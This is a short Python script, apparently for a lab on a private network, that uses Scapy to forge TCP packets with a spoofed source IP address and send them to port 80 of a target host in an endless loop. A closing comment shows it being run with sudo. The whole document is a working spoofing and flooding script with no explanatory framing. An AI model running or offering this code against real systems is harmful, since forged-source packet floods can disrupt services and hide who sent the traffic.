from scapy.all import *
A = "192.168.5.126" # spoofed source IP address
B = "192.168.5.135" # destination IP address
C = RandShort() # Random short integer for source port (0–65535)
D = 80 # destination port
payload = "Hello Hello Hello" # Data to send
while True:
    spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / payload
    send(spoofed_packet)


#sudo python3 spoof.py